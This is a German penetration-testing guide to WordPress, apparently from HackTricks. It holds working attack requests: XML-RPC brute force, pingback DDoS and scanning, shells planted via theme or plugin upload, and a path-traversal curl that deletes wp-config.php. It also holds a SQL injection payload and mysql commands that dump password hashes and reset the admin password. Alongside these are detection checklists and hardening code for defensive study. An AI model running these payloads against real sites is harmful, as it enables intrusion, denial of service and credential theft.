# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Grundinformationen

- **Hochgeladene** Dateien gehen zu: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Theme-Dateien finden Sie in /wp-content/themes/,** also wenn Sie etwas PHP des Themes ändern, um RCE zu erhalten, werden Sie wahrscheinlich diesen Pfad verwenden. Zum Beispiel: Mit **Theme twentytwelve** können Sie die **404.php**-Datei unter: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php) **zugreifen**.

- **Eine weitere nützliche URL könnte sein:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** finden Sie das Root-Passwort der Datenbank.
- Standard-Login-Pfade zum Überprüfen: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Haupt WordPress-Dateien**

- `index.php`
- `license.txt` enthält nützliche Informationen wie die installierte WordPress-Version.
- `wp-activate.php` wird für den E-Mail-Aktivierungsprozess beim Einrichten einer neuen WordPress-Website verwendet.
- Login-Ordner (könnten umbenannt werden, um sie zu verbergen):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ist eine Datei, die ein Feature von WordPress darstellt, das es ermöglicht, Daten über HTTP zu übertragen, wobei HTTP als Transportmechanismus und XML als Kodierungsmechanismus fungiert. Diese Art der Kommunikation wurde durch die WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ersetzt.
- Der `wp-content`-Ordner ist das Hauptverzeichnis, in dem Plugins und Themes gespeichert sind.
- `wp-content/uploads/` ist das Verzeichnis, in dem alle auf die Plattform hochgeladenen Dateien gespeichert werden.
- `wp-includes/` Dies ist das Verzeichnis, in dem Kern-Dateien gespeichert sind, wie Zertifikate, Schriftarten, JavaScript-Dateien und Widgets.
- `wp-sitemap.xml` In WordPress-Versionen 5.5 und höher generiert WordPress eine Sitemap-XML-Datei mit allen öffentlichen Beiträgen und öffentlich abfragbaren Beitragstypen und Taxonomien.

**Post-Exploitation**

- Die Datei `wp-config.php` enthält Informationen, die WordPress benötigt, um eine Verbindung zur Datenbank herzustellen, wie den Datenbanknamen, den Datenbank-Host, den Benutzernamen und das Passwort, Authentifizierungsschlüssel und Salze sowie das Datenbanktabellen-Präfix. Diese Konfigurationsdatei kann auch verwendet werden, um den DEBUG-Modus zu aktivieren, was bei der Fehlersuche nützlich sein kann.

### Benutzerberechtigungen

- **Administrator**
- **Redakteur**: Veröffentlicht und verwaltet seine und andere Beiträge
- **Autor**: Veröffentlicht und verwaltet seine eigenen Beiträge
- **Mitwirkender**: Schreibt und verwaltet seine Beiträge, kann sie jedoch nicht veröffentlichen
- **Abonnent**: Durchsucht Beiträge und bearbeitet sein Profil

## **Passive Enumeration**

### **WordPress-Version abrufen**

Überprüfen Sie, ob Sie die Dateien `/license.txt` oder `/readme.html` finden können.

Im **Quellcode** der Seite (Beispiel von [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS-Link-Dateien

![](<../../images/image (533).png>)

- JavaScript-Dateien

### Plugins abrufen
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Holen Sie sich Themes
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Versionen allgemein extrahieren
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktive Enumeration

### Plugins und Themes

Sie werden wahrscheinlich nicht in der Lage sein, alle möglichen Plugins und Themes zu finden. Um alle zu entdecken, müssen Sie **aktiv eine Liste von Plugins und Themes brute-forcen** (hoffentlich gibt es automatisierte Tools, die diese Listen enthalten).

### Benutzer

- **ID Brute:** Sie erhalten gültige Benutzer von einer WordPress-Seite, indem Sie die Benutzer-IDs brute-forcen:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Wenn die Antworten **200** oder **30X** sind, bedeutet das, dass die ID **gültig** ist. Wenn die Antwort **400** ist, dann ist die ID **ungültig**.

- **wp-json:** Sie können auch versuchen, Informationen über die Benutzer abzurufen, indem Sie abfragen:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Ein weiterer `/wp-json/` Endpunkt, der einige Informationen über Benutzer offenbaren kann, ist:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Beachten Sie, dass dieser Endpunkt nur Benutzer anzeigt, die einen Beitrag erstellt haben. **Es werden nur Informationen über die Benutzer bereitgestellt, die diese Funktion aktiviert haben**.

Beachten Sie auch, dass **/wp-json/wp/v2/pages** IP-Adressen leaken könnte.

- **Benutzernamenenumeration beim Login**: Beim Einloggen in **`/wp-login.php`** ist die **Nachricht** **anders**, wenn der angegebene **Benutzername existiert oder nicht**.

### XML-RPC

Wenn `xml-rpc.php` aktiv ist, können Sie einen Brute-Force-Angriff auf Anmeldeinformationen durchführen oder es verwenden, um DoS-Angriffe auf andere Ressourcen zu starten. (Sie können diesen Prozess automatisieren[ indem Sie dies verwenden](https://github.com/relarizky/wpxploit) zum Beispiel).

Um zu sehen, ob es aktiv ist, versuchen Sie, auf _**/xmlrpc.php**_ zuzugreifen und senden Sie diese Anfrage:

**Überprüfen**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Anmeldeinformationen Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** oder **`metaWeblog.getUsersBlogs`** sind einige der Methoden, die verwendet werden können, um Anmeldeinformationen zu bruteforcen. Wenn Sie eine davon finden können, können Sie etwas wie senden:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Die Nachricht _"Falscher Benutzername oder Passwort"_ sollte in einer 200-Code-Antwort erscheinen, wenn die Anmeldeinformationen ungültig sind.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Mit den richtigen Anmeldeinformationen können Sie eine Datei hochladen. In der Antwort wird der Pfad angezeigt ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Es gibt auch einen **schnelleren Weg**, um Anmeldeinformationen mit **`system.multicall`** zu brute-forcen, da Sie mehrere Anmeldeinformationen in derselben Anfrage ausprobieren können:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Umgehung von 2FA**

Diese Methode ist für Programme und nicht für Menschen gedacht und ist alt, daher unterstützt sie kein 2FA. Wenn Sie also gültige Anmeldeinformationen haben, aber der Haupteingang durch 2FA geschützt ist, **könnten Sie in der Lage sein, xmlrpc.php zu missbrauchen, um sich mit diesen Anmeldeinformationen unter Umgehung von 2FA anzumelden**. Beachten Sie, dass Sie nicht alle Aktionen ausführen können, die Sie über die Konsole durchführen können, aber Sie könnten dennoch in der Lage sein, zu RCE zu gelangen, wie Ippsec es in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) erklärt.

**DDoS oder Port-Scanning**

Wenn Sie die Methode _**pingback.ping**_ in der Liste finden, können Sie WordPress anweisen, eine beliebige Anfrage an einen beliebigen Host/Port zu senden.\
Dies kann verwendet werden, um **tausende** von WordPress **Seiten** zu **bitten**, einen **Standort** zu **zugreifen** (so wird ein **DDoS** an diesem Standort verursacht) oder Sie können es verwenden, um **WordPress** dazu zu bringen, ein internes **Netzwerk** zu **scannen** (Sie können jeden Port angeben).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Wenn Sie **faultCode** mit einem Wert **größer** als **0** (17) erhalten, bedeutet das, dass der Port offen ist.

Schauen Sie sich die Verwendung von **`system.multicall`** im vorherigen Abschnitt an, um zu lernen, wie man diese Methode missbraucht, um DDoS zu verursachen.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Diese Datei existiert normalerweise im Root-Verzeichnis der Wordpress-Seite: **`/wp-cron.php`**\
Wenn diese Datei **zugegriffen** wird, wird eine "**schwere**" MySQL **Abfrage** ausgeführt, die von **Angreifern** genutzt werden könnte, um eine **DoS** zu **verursachen**.\
Außerdem wird standardmäßig `wp-cron.php` bei jedem Seitenaufruf (jedes Mal, wenn ein Client eine Wordpress-Seite anfordert) aufgerufen, was auf stark frequentierten Seiten Probleme (DoS) verursachen kann.

Es wird empfohlen, Wp-Cron zu deaktivieren und einen echten Cronjob auf dem Host zu erstellen, der die benötigten Aktionen in regelmäßigen Abständen ausführt (ohne Probleme zu verursachen).

### /wp-json/oembed/1.0/proxy - SSRF

Versuchen Sie, _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ aufzurufen, und die Wordpress-Seite könnte eine Anfrage an Sie senden.

Dies ist die Antwort, wenn es nicht funktioniert:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Dieses Tool überprüft, ob die **methodName: pingback.ping** und der Pfad **/wp-json/oembed/1.0/proxy** existieren, und versucht, diese auszunutzen.

## Automatische Werkzeuge
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Zugriff durch Überschreiben eines Bits erhalten

Mehr als ein echter Angriff ist dies eine Neugier. Im CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) konntest du 1 Bit aus einer beliebigen WordPress-Datei umkehren. Du konntest also die Position `5389` der Datei `/var/www/html/wp-includes/user.php` umkehren, um die NOT-Operation (`!`) zu NOPen.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Ändern einer PHP-Datei des verwendeten Themas (Admin-Anmeldeinformationen erforderlich)**

Aussehen → Theme-Editor → 404-Vorlage (rechts)

Ändern Sie den Inhalt in eine PHP-Shell:

![](<../../images/image (384).png>)

Suchen Sie im Internet, wie Sie auf diese aktualisierte Seite zugreifen können. In diesem Fall müssen Sie hier zugreifen: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Sie können verwenden:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
um eine Sitzung zu erhalten.

## Plugin RCE

### PHP-Plugin

Es kann möglich sein, .php-Dateien als Plugin hochzuladen.\
Erstellen Sie Ihre PHP-Hintertür beispielsweise mit:

![](<../../images/image (183).png>)

Fügen Sie dann ein neues Plugin hinzu:

![](<../../images/image (722).png>)

Laden Sie das Plugin hoch und drücken Sie auf Jetzt installieren:

![](<../../images/image (249).png>)

Klicken Sie auf Fortfahren:

![](<../../images/image (70).png>)

Wahrscheinlich wird dies anscheinend nichts bewirken, aber wenn Sie zu Medien gehen, werden Sie Ihre hochgeladene Shell sehen:

![](<../../images/image (462).png>)

Greifen Sie darauf zu und Sie werden die URL sehen, um die Reverse-Shell auszuführen:

![](<../../images/image (1006).png>)

### Hochladen und Aktivieren eines bösartigen Plugins

Diese Methode beinhaltet die Installation eines bösartigen Plugins, das als anfällig bekannt ist und ausgenutzt werden kann, um eine Web-Shell zu erhalten. Dieser Prozess wird über das WordPress-Dashboard wie folgt durchgeführt:

1. **Plugin-Akquisition**: Das Plugin wird aus einer Quelle wie Exploit DB wie [**hier**](https://www.exploit-db.com/exploits/36374) bezogen.
2. **Plugin-Installation**:
- Navigieren Sie zum WordPress-Dashboard, gehen Sie dann zu `Dashboard > Plugins > Plugin hochladen`.
- Laden Sie die Zip-Datei des heruntergeladenen Plugins hoch.
3. **Plugin-Aktivierung**: Sobald das Plugin erfolgreich installiert ist, muss es über das Dashboard aktiviert werden.
4. **Ausnutzung**:
- Mit dem installierten und aktivierten Plugin "reflex-gallery" kann es ausgenutzt werden, da es als anfällig bekannt ist.
- Das Metasploit-Framework bietet einen Exploit für diese Schwachstelle. Durch Laden des entsprechenden Moduls und Ausführen spezifischer Befehle kann eine Meterpreter-Sitzung eingerichtet werden, die unbefugten Zugriff auf die Site gewährt.
- Es wird angemerkt, dass dies nur eine der vielen Methoden ist, um eine WordPress-Website auszunutzen.

Der Inhalt enthält visuelle Hilfsmittel, die die Schritte im WordPress-Dashboard zur Installation und Aktivierung des Plugins darstellen. Es ist jedoch wichtig zu beachten, dass das Ausnutzen von Schwachstellen auf diese Weise illegal und unethisch ist, ohne die entsprechende Genehmigung. Diese Informationen sollten verantwortungsbewusst und nur in einem rechtlichen Kontext verwendet werden, wie z.B. bei Penetrationstests mit ausdrücklicher Genehmigung.

**Für detailliertere Schritte siehe:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Von XSS zu RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ist ein Skript, das entwickelt wurde, um eine **Cross-Site Scripting (XSS)**-Schwachstelle in **Remote Code Execution (RCE)** oder andere kritische Schwachstellen in WordPress zu eskalieren. Für weitere Informationen siehe [**diesen Beitrag**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Es bietet **Unterstützung für WordPress-Versionen 6.X.X, 5.X.X und 4.X.X und ermöglicht:**
- _**Privilegieneskalation:**_ Erstellt einen Benutzer in WordPress.
- _**(RCE) Benutzerdefiniertes Plugin (Hintertür) hochladen:**_ Laden Sie Ihr benutzerdefiniertes Plugin (Hintertür) in WordPress hoch.
- _**(RCE) Eingebautes Plugin bearbeiten:**_ Bearbeiten Sie ein eingebautes Plugin in WordPress.
- _**(RCE) Eingebautes Theme bearbeiten:**_ Bearbeiten Sie ein eingebautes Theme in WordPress.
- _**(Benutzerdefiniert) Benutzerdefinierte Exploits:**_ Benutzerdefinierte Exploits für Drittanbieter-WordPress-Plugins/Themes.

## Nach der Ausnutzung

Benutzernamen und Passwörter extrahieren:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Ändern Sie das Admin-Passwort:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Angriffsfläche

Zu wissen, wie ein Wordpress-Plugin Funktionen offenlegen kann, ist entscheidend, um Schwachstellen in seiner Funktionalität zu finden. Sie können herausfinden, wie ein Plugin Funktionen offenlegen könnte, in den folgenden Aufzählungspunkten und einigen Beispielen für anfällige Plugins in [**diesem Blogbeitrag**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Eine der Möglichkeiten, wie ein Plugin Funktionen für Benutzer offenlegen kann, ist über AJAX-Handler. Diese könnten Logik-, Autorisierungs- oder Authentifizierungsfehler enthalten. Darüber hinaus ist es häufig der Fall, dass diese Funktionen sowohl die Authentifizierung als auch die Autorisierung auf das Vorhandensein eines Wordpress-Nonce stützen, den **jeder Benutzer, der in der Wordpress-Instanz authentifiziert ist, haben könnte** (unabhängig von seiner Rolle).

Dies sind die Funktionen, die verwendet werden können, um eine Funktion in einem Plugin offenzulegen:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Die Verwendung von `nopriv` macht den Endpunkt für alle Benutzer zugänglich (auch für nicht authentifizierte).**

> [!CAUTION]
> Darüber hinaus, wenn die Funktion nur die Autorisierung des Benutzers mit der Funktion `wp_verify_nonce` überprüft, prüft diese Funktion nur, ob der Benutzer angemeldet ist, normalerweise wird die Rolle des Benutzers nicht überprüft. Daher könnten Benutzer mit niedrigen Berechtigungen Zugriff auf hochprivilegierte Aktionen haben.

- **REST API**

Es ist auch möglich, Funktionen von WordPress zu exponieren, indem man eine REST-API mit der Funktion `register_rest_route` registriert:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Der `permission_callback` ist eine Rückruffunktion, die überprüft, ob ein gegebener Benutzer berechtigt ist, die API-Methode aufzurufen.

**Wenn die eingebaute `__return_true`-Funktion verwendet wird, wird die Überprüfung der Benutzerberechtigungen einfach übersprungen.**

- **Direkter Zugriff auf die PHP-Datei**

Natürlich verwendet WordPress PHP, und Dateien innerhalb von Plugins sind direkt über das Web zugänglich. Falls ein Plugin also eine verwundbare Funktionalität offenlegt, die durch den Zugriff auf die Datei ausgelöst wird, ist es für jeden Benutzer ausnutzbar.

### Unauthentifizierte willkürliche Dateilöschung über wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress-Themes und -Plugins legen häufig AJAX-Handler über die `wp_ajax_` und `wp_ajax_nopriv_` Hooks offen. Wenn die **_nopriv_**-Variante verwendet wird, **wird der Rückruf für unauthentifizierte Besucher erreichbar**, sodass jede sensible Aktion zusätzlich implementieren muss:

1. Eine **Berechtigungsüberprüfung** (z. B. `current_user_can()` oder mindestens `is_user_logged_in()`), und
2. Ein **CSRF-Nonce**, validiert mit `check_ajax_referer()` / `wp_verify_nonce()`, und
3. **Strenge Eingabesäuberung / Validierung**.

Das Litho-Multipurpose-Theme (< 3.1) hat diese 3 Kontrollen in der *Remove Font Family*-Funktion vergessen und endete mit folgendem Code (vereinfacht):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Unauthenticated access** – der `wp_ajax_nopriv_` Hook ist registriert.
* **No nonce / capability check** – jeder Besucher kann den Endpunkt aufrufen.
* **No path sanitisation** – der vom Benutzer kontrollierte `fontfamily`-String wird ohne Filterung an einen Dateisystempfad angehängt, was klassische `../../` Traversierung ermöglicht.

#### Exploitation

Ein Angreifer kann jede Datei oder jedes Verzeichnis **unterhalb des Uploads-Stammverzeichnisses** (normalerweise `<wp-root>/wp-content/uploads/`) löschen, indem er eine einzige HTTP POST-Anfrage sendet:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Weil `wp-config.php` außerhalb von *uploads* liegt, sind vier `../`-Sequenzen bei einer Standardinstallation ausreichend. Das Löschen von `wp-config.php` zwingt WordPress beim nächsten Besuch in den *Installationsassistenten*, was eine vollständige Übernahme der Seite ermöglicht (der Angreifer gibt lediglich eine neue DB-Konfiguration ein und erstellt einen Admin-Benutzer).

Weitere wichtige Ziele sind Plugin-/Theme-`.php`-Dateien (um Sicherheits-Plugins zu umgehen) oder `.htaccess`-Regeln.

#### Erkennungs-Checkliste

* Jeder `add_action( 'wp_ajax_nopriv_...')`-Callback, der Dateisystem-Helfer aufruft (`copy()`, `unlink()`, `$wp_filesystem->delete()`, usw.).
* Verkettung von unsaniertem Benutzereingaben in Pfade (suchen Sie nach `$_POST`, `$_GET`, `$_REQUEST`).
* Abwesenheit von `check_ajax_referer()` und `current_user_can()`/`is_user_logged_in()`.

#### Härtung
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Behandeln** Sie jede Schreib-/Löschoperation auf der Festplatte immer als privilegiert und überprüfen Sie doppelt:
> • Authentifizierung  • Autorisierung  • Nonce  • Eingabesäuberung  • Pfadbegrenzung (z. B. über `realpath()` plus `str_starts_with()`).

---

### Privilegieneskalation durch veraltete Rollenwiederherstellung und fehlende Autorisierung (ASE "View Admin as Role")

Viele Plugins implementieren eine "als Rolle anzeigen" oder temporäre Rollenwechsel-Funktion, indem sie die ursprüngliche(n) Rolle(n) in den Benutzermetadaten speichern, damit sie später wiederhergestellt werden können. Wenn der Wiederherstellungspfad nur auf Anfrageparametern (z. B. `$_REQUEST['reset-for']`) und einer vom Plugin verwalteten Liste basiert, ohne die Berechtigungen und eine gültige Nonce zu überprüfen, wird dies zu einer vertikalen Privilegieneskalation.

Ein Beispiel aus der Praxis wurde im Admin and Site Enhancements (ASE) Plugin (≤ 7.6.2.1) gefunden. Der Reset-Zweig stellte Rollen basierend auf `reset-for=<Benutzername>` wieder her, wenn der Benutzername in einem internen Array `$options['viewing_admin_as_role_are']` erschien, führte jedoch weder eine `current_user_can()`-Überprüfung noch eine Nonce-Überprüfung durch, bevor die aktuellen Rollen entfernt und die gespeicherten Rollen aus den Benutzermetadaten `_asenha_view_admin_as_original_roles` wieder hinzugefügt wurden:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Warum es ausnutzbar ist

- Vertraut `$_REQUEST['reset-for']` und einer Plugin-Option ohne serverseitige Autorisierung.
- Wenn ein Benutzer zuvor höhere Berechtigungen in `_asenha_view_admin_as_original_roles` gespeichert hatte und herabgestuft wurde, kann er diese durch Aufrufen des Reset-Pfads wiederherstellen.
- In einigen Implementierungen konnte jeder authentifizierte Benutzer einen Reset für einen anderen Benutzernamen auslösen, der noch in `viewing_admin_as_role_are` vorhanden ist (gebrochene Autorisierung).

Angriffsanforderungen

- Verwundbare Plugin-Version mit aktivierter Funktion.
- Zielkonto hat eine veraltete hochprivilegierte Rolle, die aus früherer Nutzung im Benutzermeta gespeichert ist.
- Jede authentifizierte Sitzung; fehlender Nonce/Fähigkeit im Reset-Flow.

Ausnutzung (Beispiel)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Auf anfälligen Builds entfernt dies die aktuellen Rollen und fügt die gespeicherten ursprünglichen Rollen (z. B. `administrator`) wieder hinzu, was effektiv die Berechtigungen erhöht.

Erkennungscheckliste

- Suchen Sie nach Funktionen zum Rollenwechsel, die „ursprüngliche Rollen“ in den Benutzermetadaten speichern (z. B. `_asenha_view_admin_as_original_roles`).
- Identifizieren Sie Rücksetz-/Wiederherstellungspfade, die:
  - Benutzernamen aus `$_REQUEST` / `$_GET` / `$_POST` lesen.
  - Rollen über `add_role()` / `remove_role()` ohne `current_user_can()` und `wp_verify_nonce()` / `check_admin_referer()` ändern.
  - Basierend auf einem Plugin-Optionsarray (z. B. `viewing_admin_as_role_are`) autorisieren, anstatt auf den Fähigkeiten des Akteurs.

Härtung

- Erzwingen Sie Berechtigungsprüfungen in jedem zustandsändernden Zweig (z. B. `current_user_can('manage_options')` oder strenger).
- Erfordern Sie Nonces für alle Rollen-/Berechtigungsänderungen und überprüfen Sie diese: `check_admin_referer()` / `wp_verify_nonce()`.
- Vertrauen Sie niemals auf von Anfragen bereitgestellte Benutzernamen; ermitteln Sie den Zielbenutzer serverseitig basierend auf dem authentifizierten Akteur und einer expliziten Richtlinie.
- Ungültig machen Sie den Zustand „ursprüngliche Rollen“ bei Profil-/Rollenaktualisierungen, um eine veraltete Wiederherstellung von Hochprivilegien zu vermeiden:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Erwägen Sie, minimalen Zustand zu speichern und zeitlich begrenzte, berechtigungsbewachte Tokens für temporäre Rollenwechsel zu verwenden.

---

## WordPress-Schutz

### Regelmäßige Updates

Stellen Sie sicher, dass WordPress, Plugins und Themes auf dem neuesten Stand sind. Bestätigen Sie auch, dass die automatische Aktualisierung in wp-config.php aktiviert ist:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Auch, **installieren Sie nur vertrauenswürdige WordPress-Plugins und -Themes**.

### Sicherheits-Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Weitere Empfehlungen**

- Entfernen Sie den standardmäßigen **Admin**-Benutzer
- Verwenden Sie **starke Passwörter** und **2FA**
- Überprüfen Sie regelmäßig die **Berechtigungen** der Benutzer
- **Begrenzen Sie die Anmeldeversuche**, um Brute-Force-Angriffe zu verhindern
- Benennen Sie die **`wp-admin.php`**-Datei um und erlauben Sie den Zugriff nur intern oder von bestimmten IP-Adressen.

### Unauthentifizierte SQL-Injection durch unzureichende Validierung (WP Job Portal <= 2.3.2)

Das WP Job Portal-Rekrutierungs-Plugin hat eine **savecategory**-Aufgabe offengelegt, die letztendlich den folgenden anfälligen Code innerhalb von `modules/category/model.php::validateFormData()` ausführt:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** – `parentid` kommt direkt aus der HTTP-Anfrage.
2. **Stringverkettung innerhalb der WHERE-Klausel** – kein `is_numeric()` / `esc_sql()` / vorbereitete Anweisung.
3. **Unauthenticated reachability** – obwohl die Aktion über `admin-post.php` ausgeführt wird, ist die einzige Überprüfung ein **CSRF nonce** (`wp_verify_nonce()`), den jeder Besucher von einer öffentlichen Seite abrufen kann, die den Shortcode `[wpjobportal_my_resumes]` einbettet.

#### Exploitation

1. Frischen nonce abrufen:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Arbiträres SQL injizieren, indem `parentid` missbraucht wird:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
